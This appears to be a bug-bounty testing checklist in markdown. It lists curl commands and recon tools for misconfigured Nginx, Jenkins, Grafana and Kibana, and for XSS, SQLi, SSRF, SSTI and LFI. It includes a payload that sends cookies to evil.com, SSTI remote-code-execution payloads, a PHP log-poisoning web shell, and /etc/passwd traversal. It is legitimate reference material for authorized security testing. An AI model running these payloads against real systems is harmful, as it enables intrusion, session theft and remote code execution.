# Technologies
<!-- categoryKey: technologies | icon: 🛠️ | color: #e06c75 -->
Security checklists for common web technologies and infrastructure components.

---

## Nginx
<!-- id: nginx | icon: 🛠️ | color: #e06c75 -->
Security checklists for Nginx web server hardening and misconfiguration testing.

### Check Nginx version disclosure
<!-- id: nginx-1 | severity: low | tags: nginx, info-disclosure, hardening -->
Verify that Nginx isn't leaking version numbers in server headers or error pages.

**Commands:**
```
curl -I https://target.com | grep -i server
curl -I https://target.com/404 | grep -i nginx
```

**References:**
- https://nginx.org/en/docs/http/ngx_http_core_module.html#server_tokens

### Test for Nginx alias traversal (CRLF & path traversal)
<!-- id: nginx-2 | severity: high | tags: nginx, path-traversal, misconfiguration -->
Misconfigured alias directives can lead to path traversal allowing access to files outside the intended root directory.

**Commands:**
```
curl -v 'https://target.com/assets../'
curl -v 'https://target.com/static../app.py'
```

**References:**
- https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/

### Check for Nginx buffer overflow protections
<!-- id: nginx-3 | severity: medium | tags: nginx, buffer-overflow, hardening -->
Ensure client body buffer size and header buffer size limits are configured to prevent buffer overflow attacks.

**Commands:**
```
curl -v -H 'Host: '$(python3 -c 'print("A"*10000)')'' https://target.com
```

**References:**
- https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size

---

## Jenkins
<!-- id: jenkins | icon: 🛠️ | color: #e06c75 -->
Security checklists for Jenkins CI/CD server hardening and vulnerability testing.

### Check for unauthenticated Jenkins access
<!-- id: jenkins-1 | severity: critical | tags: jenkins, unauthorized-access, critical -->
Jenkins instances without authentication expose jobs, build logs, and credentials.

**Commands:**
```
curl -s https://target.com:8080/script
curl -s https://target.com:8080/api/json
```

**References:**
- https://www.jenkins.io/doc/book/security/securing-jenkins/

### Check Jenkins script console (RCE)
<!-- id: jenkins-2 | severity: critical | tags: jenkins, rce, critical -->
The Jenkins script console (/script) allows execution of arbitrary Groovy code.

**Commands:**
```
curl -s https://target.com:8080/script
curl -s https://target.com:8080/scriptText
```

**References:**
- https://www.jenkins.io/doc/book/managing/script-console/

### Test Jenkins credential leakage via build logs
<!-- id: jenkins-3 | severity: high | tags: jenkins, credential-leakage, high -->
Build logs often contain plaintext credentials, API keys, or tokens.

**Commands:**
```
curl -s https://target.com:8080/job/<job-name>/lastBuild/consoleText
```

**References:**
- https://www.jenkins.io/doc/book/using/using-credentials/

---

## Grafana
<!-- id: grafana | icon: 🛠️ | color: #e06c75 -->
Security checklists for Grafana monitoring dashboard hardening.

### Check for unauthenticated Grafana dashboard access
<!-- id: grafana-1 | severity: high | tags: grafana, unauthorized-access, info-disclosure -->
Default Grafana installs may allow public access to dashboards.

**Commands:**
```
curl -s https://target.com:3000/api/search?type=dash-db
curl -s https://target.com:3000/dashboards
```

**References:**
- https://grafana.com/docs/grafana/latest/administration/security/

### Check Grafana API key exposure
<!-- id: grafana-2 | severity: high | tags: grafana, api-key, credential-leakage -->
Grafana API keys in config files can be leaked via SSRF or file read vulnerabilities.

**Commands:**
```
curl -s https://target.com:3000/api/admin/stats
curl -s https://target.com:3000/api/org
```

**References:**
- https://grafana.com/docs/grafana/latest/administration/api-keys/

### Check for Grafana directory traversal (CVE-2021-43798)
<!-- id: grafana-3 | severity: critical | tags: grafana, path-traversal, cve -->
Older Grafana versions (< 8.3.1) are vulnerable to directory traversal via plugin asset URLs.

**Commands:**
```
curl --path-as-is 'https://target.com:3000/public/plugins/alertGroups/../../../../../../../../etc/passwd'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798

---

## Kibana
<!-- id: kibana | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kibana analytics dashboard hardening.

### Check for unauthenticated Kibana access
<!-- id: kibana-1 | severity: high | tags: kibana, unauthorized-access, info-disclosure -->
Kibana may expose Elasticsearch data without authentication.

**Commands:**
```
curl -s https://target.com:5601/api/status
curl -s https://target.com:5601/app/kibana
```

**References:**
- https://www.elastic.co/guide/en/kibana/current/security.html

### Check for Kibana prototype pollution (CVE-2019-7609)
<!-- id: kibana-2 | severity: critical | tags: kibana, rce, cve -->
Kibana versions < 6.6.1 are vulnerable to prototype pollution leading to RCE.

**Commands:**
```
curl -s https://target.com:5601/api/timelion/functions
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7609

### Check Kibana for Elasticsearch data leakage
<!-- id: kibana-3 | severity: high | tags: kibana, data-leakage, misconfiguration -->
If Kibana has weak index permissions, attackers may access sensitive Elasticsearch indices.

**Commands:**
```
curl -s https://target.com:5601/api/saved_objects/_find?type=index-pattern
```

**References:**
- https://www.elastic.co/guide/en/kibana/current/xpack-security-authorization.html

---

# Subdomain Statuses
<!-- categoryKey: subdomains | icon: 🌐 | color: #61afef -->
Checklists for handling subdomains by their HTTP response status codes during reconnaissance.

---

## 403 Subdomains
<!-- id: 403-subdomains | icon: 🌐 | color: #61afef -->
Techniques to bypass 403 forbidden responses and access restricted areas.

### Bypass 403 with different HTTP methods
<!-- id: sub-403-1 | severity: medium | tags: 403, bypass, http-methods -->
Try alternative HTTP methods (POST, PUT, PATCH, OPTIONS) — some endpoints block GET but allow POST or PUT.

**Commands:**
```
curl -X POST https://target.com/admin/
curl -X PUT https://target.com/admin/
curl -X OPTIONS https://target.com/admin/
curl -X PATCH https://target.com/admin/
```

**References:**
- https://portswigger.net/web-security/access-control

### Bypass 403 with headers (X-Forwarded-For, X-Original-URL)
<!-- id: sub-403-2 | severity: medium | tags: 403, bypass, headers -->
Spoof internal IP addresses using common headers. Some proxies trust X-Forwarded-For for access decisions.

**Commands:**
```
curl -H 'X-Forwarded-For: 127.0.0.1' https://target.com/admin/
curl -H 'X-Original-URL: /admin/' https://target.com/
curl -H 'X-Rewrite-URL: /admin/' https://target.com/
curl -H 'X-Custom-IP-Authorization: 127.0.0.1' https://target.com/admin/
```

**References:**
- https://portswigger.net/web-security/access-control/security.txt

### Bypass 403 with path normalization
<!-- id: sub-403-3 | severity: medium | tags: 403, bypass, path-manipulation -->
Use path traversal characters, URL encoding, or double slashes to confuse access control rules.

**Commands:**
```
curl 'https://target.com/admin/..;/'
curl 'https://target.com/./admin/'
curl 'https://target.com//admin/'
curl 'https://target.com/Admin/'
curl 'https://target.com/%2fadmin/'
```

**References:**
- https://portswigger.net/web-security/access-control/path-traversal

---

## 404 Subdomains
<!-- id: 404-subdomains | icon: 🌐 | color: #61afef -->
Techniques to extract value from 404 responses and find hidden endpoints.

### Check 404 for hidden endpoints via fuzzing
<!-- id: sub-404-1 | severity: low | tags: 404, fuzzing, discovery -->
A 404 page might hide actual endpoints. Use directory brute-forcing to discover hidden resources.

**Commands:**
```
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
```

**References:**
- https://github.com/ffuf/ffuf

### Test 404 for custom error page information disclosure
<!-- id: sub-404-2 | severity: low | tags: 404, info-disclosure -->
Custom 404 pages may leak framework versions, server paths, or application internals.

**Commands:**
```
curl -s https://target.com/nonexistent123 | grep -i 'stack\|trace\|error\|version'
curl -sI https://target.com/nonexistent123
```

---

## 301 Subdomains
<!-- id: 301-subdomains | icon: 🌐 | color: #61afef -->
Techniques to analyze 301 redirects for information gathering and open redirects.

### Follow 301 redirects to find the final destination
<!-- id: sub-301-1 | severity: info | tags: 301, redirect, recon -->
301 redirects may point to different origins, exposing staging environments or internal services.

**Commands:**
```
curl -sI -L https://target.com | grep -i 'location\|host'
curl -sI https://target.com | grep -i location
```

### Check 301 for open redirect via header injection
<!-- id: sub-301-2 | severity: medium | tags: 301, open-redirect -->
Some redirects can be manipulated by injecting newlines or additional headers.

**Commands:**
```
curl -sI 'https://target.com/redirect?url=https://evil.com'
curl -sI 'https://target.com//evil.com/'
```

**References:**
- https://portswigger.net/web-security/ssrf

---

## 302 Subdomains
<!-- id: 302-subdomains | icon: 🌐 | color: #61afef -->
Techniques to test 302 redirects for OAuth bypasses and open redirect vulnerabilities.

### Check 302 redirect for parameter manipulation
<!-- id: sub-302-1 | severity: medium | tags: 302, open-redirect, parameter -->
302 redirects often take a 'url' or 'redirect' parameter that may be modifiable for open redirect.

**Commands:**
```
curl -sI 'https://target.com/login?redirect=https://evil.com'
curl -sI 'https://target.com/?next=https://evil.com'
curl -sI 'https://target.com/?returnUrl=https://evil.com'
```

**References:**
- https://portswigger.net/web-security/dom-based/open-redirect

### Test 302 for OAuth callback/redirect URI bypass
<!-- id: sub-302-2 | severity: high | tags: 302, oauth, bypass -->
OAuth flows often use 302 redirects with callback URIs that may accept open redirect bypasses.

**Commands:**
```
curl -sI 'https://target.com/auth/callback?redirect_uri=https://evil.com'
curl -sI 'https://target.com/auth/callback?redirect_uri=https://target.com.evil.com/'
```

**References:**
- https://portswigger.net/web-security/oauth

---

## 200 Subdomains
<!-- id: 200-subdomains | icon: 🌐 | color: #61afef -->
Techniques to thoroughly assess live subdomains returning 200 OK.

### Enumerate all endpoints on 200 subdomains
<!-- id: sub-200-1 | severity: info | tags: 200, enumeration, recon -->
Subdomains returning 200 are live. Thoroughly enumerate all directories, files, and APIs.

**Commands:**
```
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

### Check 200 subdomain for technology fingerprinting
<!-- id: sub-200-2 | severity: info | tags: 200, fingerprinting, recon -->
Identify technologies via headers, cookies, and page content to build an attack surface.

**Commands:**
```
curl -sI https://target.com | grep -i 'server\|x-powered-by\|set-cookie'
whatweb https://target.com
wappalyzer https://target.com
```

**References:**
- https://www.wappalyzer.com/

### Check 200 for sensitive files and misconfigurations
<!-- id: sub-200-3 | severity: high | tags: 200, sensitive-files, exposure -->
Look for exposed .git, .env, sitemap.xml, robots.txt, backup files, and admin panels.

**Commands:**
```
curl -s https://target.com/.git/config
curl -s https://target.com/.env
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml
curl -s https://target.com/backup/
curl -s https://target.com/admin/
```

---

# Vulnerabilities
<!-- categoryKey: vulnerabilities | icon: 💥 | color: #e5c07b -->
Testing checklists for common web vulnerability classes, ordered by impact and complexity.

---

## XSS (Cross-Site Scripting)
<!-- id: xss | icon: 💥 | color: #e5c07b -->
Checklists for finding Reflected, Stored, and DOM-based Cross-Site Scripting vulnerabilities.

### Test for reflected XSS in URL parameters
<!-- id: xss-1 | severity: high | tags: xss, reflected, injection -->
Inject JavaScript payloads in all URL parameters. Check if input is reflected without sanitization.

**Commands:**
```
curl -s 'https://target.com/search?q=<script>alert(1)</script>' | grep -i 'alert'
curl -s 'https://target.com/?cat=1&page=<img src=x onerror=alert(1)>' | grep -i 'onerror'
```

**References:**
- https://portswigger.net/web-security/cross-site-scripting/reflected

### Test for stored XSS in user inputs
<!-- id: xss-2 | severity: critical | tags: xss, stored, injection -->
Submit XSS payloads in forms, comments, profile fields. Payloads execute when other users view the page.

**Commands:**
```
Submit <script>alert(document.cookie)</script> in comment/name fields
Submit <img src=x onerror='fetch("https://evil.com/"+document.cookie)'> in profile fields
```

**References:**
- https://portswigger.net/web-security/cross-site-scripting/stored

### Test DOM-based XSS via fragment/hash
<!-- id: xss-3 | severity: high | tags: xss, dom-based, client-side -->
Check if JavaScript uses location.hash or document.URL without sanitization.

**Commands:**
```
document.location.hash = '<img src=x onerror=alert(1)>';
document.location = 'https://target.com/#<script>alert(1)</script>';
```

**References:**
- https://portswigger.net/web-security/cross-site-scripting/dom-based

### Test XSS in file upload filenames
<!-- id: xss-4 | severity: medium | tags: xss, file-upload, stored -->
Upload files with XSS payloads in filenames. If filename is reflected, it may execute in a browser.

**Commands:**
```
Upload file named: <script>alert(1)</script>.txt
Upload file named: "><img src=x onerror=alert(1)>.txt
```

**References:**
- https://portswigger.net/research/file-upload-attacks

---

## Open Redirect
<!-- id: open-redirect | icon: 💥 | color: #e5c07b -->
Checklists for finding and bypassing open redirect vulnerabilities.

### Check URL redirect parameters for open redirect
<!-- id: open-redirect-1 | severity: medium | tags: open-redirect, url-manipulation -->
Common redirect parameters (url, redirect, next, returnTo) can often be abused to redirect users to external sites.

**Commands:**
```
curl -sI 'https://target.com/redirect?url=https://evil.com'
curl -sI 'https://target.com/go?to=https://evil.com'
curl -sI 'https://target.com/?next=https://evil.com'
curl -sI 'https://target.com/?returnUrl=https://evil.com'
```

**References:**
- https://portswigger.net/web-security/dom-based/open-redirect

### Test open redirect with URL parsers bypass
<!-- id: open-redirect-2 | severity: medium | tags: open-redirect, bypass, url-parser -->
Use protocol confusion, CRLF injection, or @ character to bypass URL validation filters.

**Commands:**
```
curl -sI 'https://target.com/redirect?url=https://target.com@evil.com'
curl -sI 'https://target.com/redirect?url=//evil.com'
curl -sI 'https://target.com/redirect?url=///evil.com'
curl -sI 'https://target.com/redirect?url=https://evil.com%2f@target.com'
```

**References:**
- https://portswigger.net/web-security/dom-based/open-redirect

---

## SQL Injection (SQLi)
<!-- id: sql-injection | icon: 💥 | color: #e5c07b -->
Checklists for detecting and exploiting SQL injection vulnerabilities.

### Test for SQL injection with time-based payloads
<!-- id: sqli-1 | severity: critical | tags: sqli, time-based, blind -->
Use time-based SQL injection to identify blind SQLi. Delayed response indicates a potential injection point.

**Commands:**
```
curl -s 'https://target.com/product?id=1'
curl -s 'https://target.com/product?id=1%20WAITFOR%20DELAY%20%2700:00:05%270'
curl -s 'https://target.com/product?id=1'%20AND%20SLEEP(5)--
```

**References:**
- https://portswigger.net/web-security/sql-injection

### Test for error-based SQL injection
<!-- id: sqli-2 | severity: critical | tags: sqli, error-based, enumeration -->
Inject SQL syntax errors to trigger database error messages that can leak schema info.

**Commands:**
```
curl -s 'https://target.com/product?id=1%27'
curl -s 'https://target.com/product?id=1%22'
curl -s 'https://target.com/product?id=1%27%20AND%201=CONVERT(int,%20@@version)--'
```

**References:**
- https://portswigger.net/web-security/sql-injection/cheat-sheet

---

## SSRF
<!-- id: ssrf | icon: 💥 | color: #e5c07b -->
Checklists for detecting Server-Side Request Forgery vulnerabilities.

### Test SSRF by targeting internal services
<!-- id: ssrf-1 | severity: critical | tags: ssrf, internal, cloud -->
Input URLs targeting internal services (127.0.0.1, 169.254.169.254) to access internal metadata.

**Commands:**
```
curl -s 'https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/'
curl -s 'https://target.com/fetch?url=http://127.0.0.1:22'
curl -s 'https://target.com/fetch?url=http://10.0.0.1:8080'
```

**References:**
- https://portswigger.net/web-security/ssrf

### Test SSRF via DNS rebinding
<!-- id: ssrf-2 | severity: critical | tags: ssrf, dns-rebinding, advanced -->
Use DNS rebinding to bypass hostname-based allowlists to access internal IPs.

**Commands:**
```
Use a DNS rebinding tool like rebind.it or 1u.ms
```

**References:**
- https://portswigger.net/web-security/ssrf/dns-rebinding

---

## SSTI (Server-Side Template Injection)
<!-- id: ssti | icon: 💥 | color: #e5c07b -->
Checklists for detecting and exploiting Server-Side Template Injection.

### Test for SSTI with basic math expressions
<!-- id: ssti-1 | severity: critical | tags: ssti, injection, template -->
Inject {{7*7}} in inputs. If output contains '49', the template engine evaluates user input.

**Commands:**
```
curl -s 'https://target.com/hello?name={{7*7}}' | grep '49'
curl -s 'https://target.com/hello?name=${{7*7}}' | grep '49'
curl -s 'https://target.com/hello?name=#{7*7}' | grep '49'
```

**References:**
- https://portswigger.net/web-security/server-side-template-injection

### Test SSTI for RCE via template engine
<!-- id: ssti-2 | severity: critical | tags: ssti, rce, exploitation -->
Once SSTI is confirmed, use engine-specific payloads for RCE (Jinja2, Freemarker, Twig).

**Commands:**
```
Jinja2: {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
Freemarker: ${7*7} -> <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
Twig: {{ ['id']|filter('system') }}
```

**References:**
- https://portswigger.net/web-security/server-side-template-injection/exploiting
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

---

## LFI (Local File Inclusion)
<!-- id: lfi | icon: 💥 | color: #e5c07b -->
Checklists for detecting and exploiting Local File Inclusion vulnerabilities.

### Test LFI with path traversal sequences
<!-- id: lfi-1 | severity: high | tags: lfi, path-traversal, file-read -->
Use ../ sequences to traverse directories and read sensitive files like /etc/passwd.

**Commands:**
```
curl -s 'https://target.com/file?name=../../../etc/passwd' | head -20
curl -s 'https://target.com/file?name=....//....//....//etc/passwd' | head -20
curl -s 'https://target.com/file?name=..%252f..%252f..%252fetc/passwd' | head -20
```

**References:**
- https://portswigger.net/web-security/file-path-traversal

### Test LFI with PHP wrappers
<!-- id: lfi-2 | severity: high | tags: lfi, php-wrapper, source-code -->
Use php://filter to read source code without executing it.

**Commands:**
```
curl -s 'https://target.com/file?name=php://filter/convert.base64-encode/resource=index.php'
curl -s 'https://target.com/file?name=php://filter/convert.base64-encode/resource=config.php'
```

**References:**
- https://portswigger.net/web-security/file-path-traversal

### Test LFI for log injection (log poisoning)
<!-- id: lfi-3 | severity: critical | tags: lfi, log-poisoning, rce -->
Inject PHP code into server logs, then access the log file via LFI to execute injected code.

**Commands:**
```
curl -s -H 'User-Agent: <?php system($_GET["cmd"]); ?>' https://target.com/
curl -s 'https://target.com/file?name=../../../../var/log/apache2/access.log&cmd=id'
curl -s 'https://target.com/file?name=../../../../var/log/nginx/access.log&cmd=id'
```

**References:**
- https://book.hacktricks.xyz/pentesting-web/file-inclusion#log-poisoning

---

# Methodologies
<!-- categoryKey: methodologies | icon: 📋 | color: #56b6c2 -->
Step-by-step methodologies for core bug bounty reconnaissance and testing workflows.

---

## Subdomain Enumeration
<!-- id: subdomain-enumeration | icon: 📋 | color: #56b6c2 -->
Complete methodology for discovering subdomains through passive, active, and permutation techniques.

### Subdomain enumeration via passive sources
<!-- id: sub-enum-1 | severity: info | tags: subdomain-enum, passive, recon -->
Collect subdomains from passive sources like certificate logs, search engines, DNS records without touching the target.

**Commands:**
```
curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u
subfinder -d target.com -silent
assetfinder --subs-only target.com
```

**References:**
- https://github.com/projectdiscovery/subfinder
- https://github.com/tomnomnom/assetfinder

### Subdomain enumeration via DNS brute-force
<!-- id: sub-enum-2 | severity: info | tags: subdomain-enum, dns, bruteforce -->
Brute-force common subdomain names using a wordlist against the target domain's DNS servers.

**Commands:**
```
puredns bruteforce /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt target.com -r resolvers.txt
dnsx -d target.com -w subdomains-top1million-5000.txt
```

**References:**
- https://github.com/projectdiscovery/puredns
- https://github.com/projectdiscovery/dnsx

### Subdomain permutation scanning
<!-- id: sub-enum-3 | severity: info | tags: subdomain-enum, permutations, advanced -->
Generate permutations of discovered subdomains to find hidden subdomains.

**Commands:**
```
gotator -sub discovered.target.com -perm permutations_list.txt -silent | dnsx -silent
alterx -d target.com -list discovered.txt | dnsx -silent
```

**References:**
- https://github.com/Josue87/gotator
- https://github.com/projectdiscovery/alterx

### Resolve and validate discovered subdomains
<!-- id: sub-enum-4 | severity: info | tags: subdomain-enum, validation, resolution -->
Resolve subdomains to IPs, filter live hosts, and probe for HTTP/HTTPS services.

**Commands:**
```
cat subdomains.txt | dnsx -a -resp -silent | tee resolved.txt
cat subdomains.txt | httpx -silent | tee live.txt
cat subdomains.txt | httpx -title -tech-detect -status-code -silent
```

**References:**
- https://github.com/projectdiscovery/httpx

---

## URL Crawling
<!-- id: url-crawling | icon: 📋 | color: #56b6c2 -->
Methodology for collecting URLs from JavaScript files, historical sources, and active spidering.

### Crawl URLs from JavaScript files
<!-- id: url-crawl-1 | severity: info | tags: url-crawling, javascript, recon -->
Extract endpoints embedded in JavaScript files. Many API routes exist only in JS.

**Commands:**
```
cat live.txt | katana -js-crawl -silent | tee js-endpoints.txt
gau --subs target.com | grep '\.js' | sort -u
```

**References:**
- https://github.com/projectdiscovery/katana
- https://github.com/lc/gau

### Collect URLs from historical sources
<!-- id: url-crawl-2 | severity: info | tags: url-crawling, passive, historical -->
Use passive sources to collect historically crawled URLs from Wayback Machine, CommonCrawl, etc.

**Commands:**
```
gau --subs target.com | sort -u | tee all-urls.txt
waybackurls target.com | sort -u | tee wayback-urls.txt
katana -passive -target target.com -silent
```

**References:**
- https://github.com/lc/gau
- https://github.com/tomnomnom/waybackurls

### Spider/crawl discovered subdomains
<!-- id: url-crawl-3 | severity: info | tags: url-crawling, active, spidering -->
Actively spider live subdomains to discover all accessible pages and endpoints.

**Commands:**
```
katana -u https://target.com -d 3 -silent | sort -u
gospider -s https://target.com -c 5 -t 10 -d 2 --sitemap --robots
hakrawler -url https://target.com -depth 3 -plain
```

**References:**
- https://github.com/jaeles-project/gospider
- https://github.com/hakluke/hakrawler

---

## Fuzzing
<!-- id: fuzzing | icon: 📋 | color: #56b6c2 -->
Methodology for directory, parameter, vhost, and HTTP method fuzzing techniques.

### Directory and file fuzzing
<!-- id: fuzzing-1 | severity: info | tags: fuzzing, directory, content-discovery -->
Brute-force directories and files to find hidden endpoints, admin panels, backup files.

**Commands:**
```
ffuf -u https://target.com/FUZZ -w directory-list-2.3-medium.txt -t 50 -c
ffuf -u https://target.com/FUZZ -w raft-large-files.txt -t 50 -c -mc 200,204,301,302,403
gobuster dir -u https://target.com -w common.txt -t 50
```

**References:**
- https://github.com/ffuf/ffuf
- https://github.com/OJ/gobuster

### Parameter fuzzing for hidden parameters
<!-- id: fuzzing-2 | severity: medium | tags: fuzzing, parameters, hidden -->
Discover hidden GET/POST parameters that may enable additional functionality.

**Commands:**
```
ffuf -u 'https://target.com/api/endpoint?FUZZ=1' -w burp-parameter-names.txt -fs 0
arjun -u https://target.com/api/endpoint -t 10
x8 -u https://target.com/api/endpoint -w burp-parameter-names.txt
```

**References:**
- https://github.com/s0md3v/Arjun
- https://github.com/Sh1Yo/x8

### Virtual host fuzzing
<!-- id: fuzzing-3 | severity: high | tags: fuzzing, vhost, discovery -->
Discover hidden virtual hosts by fuzzing the Host header.

**Commands:**
```
ffuf -u https://target.com -H 'Host: FUZZ.target.com' -w subdomains-top1million-5000.txt -fc 200,301,302
ffuf -u https://target.com -H 'Host: FUZZ' -w subdomains-top1million-5000.txt -fc 200
```

**References:**
- https://portswigger.net/web-security/host-header

### Content-type and HTTP method fuzzing
<!-- id: fuzzing-4 | severity: medium | tags: fuzzing, http-methods, content-type -->
Fuzz different Content-Type headers and HTTP methods to find alternative access methods.

**Commands:**
```
ffuf -u https://target.com/api/endpoint -X POST -H 'Content-Type: FUZZ' -w content-type.txt -d 'test=data'
curl -X OPTIONS https://target.com/api/endpoint -v
```

---

# Scope Types
<!-- categoryKey: scopes | icon: 🎯 | color: #c678dd -->
Checklists tailored to different bug bounty scope types — from massive FIS engagements to specific single-endpoint targets.

---

## Large Scope
<!-- id: large-scope | icon: 🎯 | color: #c678dd -->
Methodology for massive FIS-style scopes where all assets are in scope.

### Map the entire attack surface
<!-- id: scope-large-1 | severity: info | tags: large-scope, osint, recon -->
With 'Any FIS asset is in scope', discover ALL assets belonging to the organization via broad OSINT.

**Commands:**
```
amass intel -org 'Target Organization' -max 100
amass enum -d target.com -o amass-results.txt
subfinder -d target.com -silent | tee all-subs.txt
chaos -d target.com -silent | tee chaos-subs.txt
```

**References:**
- https://github.com/owasp-amass/amass
- https://github.com/projectdiscovery/chaos-client

### Find acquired/related companies
<!-- id: scope-large-2 | severity: info | tags: large-scope, acquisitions, osint -->
Large FIS scopes include all subsidiaries. Find forgotten assets from acquired companies.

**Commands:**
```
crtsh: Search target.com for related orgs via Issuer field
amass intel -whois -d target.com
Google dork: 'target.com | subsidiary'
```

### Scan all discovered IP ranges
<!-- id: scope-large-3 | severity: info | tags: large-scope, scanning, network -->
Massively scan all IP ranges belonging to the organization for open ports and services.

**Commands:**
```
mapcidr -l ip-ranges.txt -silent | naabu -rate 3000 -silent | httpx -silent
masscan -iL ip-ranges.txt -p 1-65535 --rate=10000 -oJ masscan.json
nmap -sV -sC -iL live-hosts.txt -oA nmap-scan
```

**References:**
- https://github.com/projectdiscovery/mapcidr
- https://github.com/projectdiscovery/naabu

---

## Medium Scope
<!-- id: medium-scope | icon: 🎯 | color: #c678dd -->
Methodology for *.target.com wildcard scopes with focused subdomain enumeration.

### Enumerate all subdomains of *.target.com
<!-- id: scope-medium-1 | severity: info | tags: medium-scope, subdomain-enum, recon -->
Use aggressive subdomain enumeration techniques to find every subdomain under the wildcard scope.

**Commands:**
```
subfinder -d target.com -all -silent | tee all-subs.txt
puredns bruteforce top-10000.txt target.com | tee brute-subs.txt
cat all-subs.txt brute-subs.txt | sort -u | httpx -silent | tee live.txt
```

**References:**
- https://github.com/projectdiscovery/subfinder

### Test subdomain takeovers
<!-- id: scope-medium-2 | severity: high | tags: medium-scope, takeover, subdomain -->
Check if any subdomains point to unclaimed external services that can be taken over.

**Commands:**
```
subjack -w all-subs.txt -t 50 -ssl -o takeovers.txt
subzy run --targets all-subs.txt
httpx -l all-subs.txt -status-code -cdn -silent | grep 'cloudfront\|s3\|github'
```

**References:**
- https://github.com/haccer/subjack
- https://github.com/LukaSikic/subzy

---

## Small Scope
<!-- id: small-scope | icon: 🎯 | color: #c678dd -->
Methodology for single-endpoint or narrow scopes requiring deep manual testing.

### Deep dive into single endpoint
<!-- id: scope-small-1 | severity: info | tags: small-scope, deep-dive, manual -->
With a single endpoint, focus on exhaustive testing of every feature and parameter.

**Commands:**
```
ffuf -u https://admin.target.com/FUZZ -w raft-large-directories.txt -t 50
ffuf -u https://admin.target.com/FUZZ -w raft-large-files.txt -t 50
katana -u https://admin.target.com -d 5 -silent | sort -u
```

### Exhaustive parameter testing
<!-- id: scope-small-2 | severity: medium | tags: small-scope, parameters, testing -->
Find and test every parameter the endpoint accepts. Test each for all vulnerability classes.

**Commands:**
```
arjun -u https://admin.target.com -t 20 -o params.json
x8 -u https://admin.target.com -w burp-parameter-names.txt -o params-found.txt
```

**References:**
- https://github.com/s0md3v/Arjun
- https://github.com/Sh1Yo/x8

### Authentication & session testing
<!-- id: scope-small-3 | severity: high | tags: small-scope, authentication, authorization -->
Focus on auth flaws: weak passwords, CSRF, JWT attacks, privilege escalation, and IDOR.

**Commands:**
```
jwt_tool https://admin.target.com/api/auth/token
curl -X POST https://admin.target.com/settings/update -d 'email=test@evil.com' -H 'Referer: https://evil.com'
curl https://admin.target.com/api/user/123 | curl https://admin.target.com/api/user/124
```

**References:**
- https://portswigger.net/web-security/authentication
- https://portswigger.net/web-security/access-control